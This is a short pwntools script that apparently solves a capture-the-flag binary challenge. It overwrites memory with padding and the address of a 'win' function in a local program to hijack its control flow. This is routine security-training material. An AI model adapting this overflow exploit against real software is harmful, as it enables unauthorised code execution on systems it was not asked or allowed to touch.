from pwn import *

path = './chal4-64'

e = ELF(path)
win_addr = e.symbols['win']
print('win is at 0x{:x}'.format(win_addr))

p = process(path)

print(p.recv().decode())
p.sendline(b'a'*8 + p64(win_addr))
print(p.recv().decode())
